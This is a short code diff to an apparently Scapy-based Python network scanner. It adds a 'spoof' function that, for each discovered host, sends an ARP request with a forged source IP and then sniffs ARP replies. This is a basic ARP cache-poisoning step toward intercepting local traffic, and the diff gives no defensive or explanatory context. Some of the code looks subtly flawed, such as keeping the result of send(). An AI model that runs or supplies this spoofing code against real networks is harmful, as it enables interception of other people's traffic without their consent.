@@ -19,6 +19,14 @@ def print_result(results_list):
     print("IP\t\t\tMAC Address\n-----------------------------------------")
     for client in results_list:
         print(client["ip"] + "\t\t" + client["mac"])
+        spoof(client["ip"])
+
+def spoof(ip):
+    pkt = send(ARP(op=ARP.who_has, psrc="192.168.5.51", pdst=ip))
+    x = sniff(filter="arp", count=10, timeout=2)
+    print (x.summary())
+    print ("done")
+
 
 
 scan_result = scan(sys.argv[1])
